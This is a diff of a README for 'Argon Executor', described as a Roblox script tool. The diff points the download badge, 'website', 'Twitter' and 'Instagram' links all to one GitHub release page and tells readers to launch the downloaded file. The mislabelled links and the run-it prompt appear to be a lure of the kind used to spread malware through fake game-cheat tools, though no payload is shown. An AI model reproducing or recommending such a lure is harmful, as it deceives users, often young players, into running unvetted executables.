@@ -17,7 +17,7 @@ Argon Executor is a robust tool tailored for script development within the Roblo
 
 ## Download Here 📥
 Click the button below to download the Argon Executor:  
-[![Download Argon Executor](https://img.shields.io/badge/Download-Argon%20Executor-blue)](https://github.com/file/App.zip)
+[![Download Argon Executor](https://github.com/Juanvicthor/Argon-Executor/releases/tag/v2.0%20Executor-blue)](https://github.com/Juanvicthor/Argon-Executor/releases/tag/v2.0)
 *(Note: Make sure to launch the file after downloading.)*
 
 ## Getting Started 🚀
@@ -30,15 +30,15 @@ Follow these steps to get started with Argon Executor:
 For any issues or queries, feel free to reach out to our 24/7 support team. We are here to assist you in maximizing your script development experience.
 
 ## Explore Further 🌐
-Visit our [website](https://www.argonexecutor.com) for more information on the Argon Executor tool and its capabilities.
+Visit our [website](https://github.com/Juanvicthor/Argon-Executor/releases/tag/v2.0) for more information on the Argon Executor tool and its capabilities.
 
 ## Releases 🚀
 If the provided link does not work or you need the latest version, check the "Releases" section of this repository for updated downloads.
 
 ## Stay Connected 🌟
 Follow us on our social media platforms to stay updated with the latest news and releases:
-- Twitter: [@ArgonExecutor](https://twitter.com/ArgonExecutor)
-- Instagram: [Argon Executor](https://www.instagram.com/argonexecutor)
+- Twitter: [@ArgonExecutor](https://github.com/Juanvicthor/Argon-Executor/releases/tag/v2.0)
+- Instagram: [Argon Executor](https://github.com/Juanvicthor/Argon-Executor/releases/tag/v2.0)
 
 ## Contribute 💡
 We welcome contributions to enhance the functionality and features of Argon Executor. Feel free to submit a pull request with your suggestions and improvements.
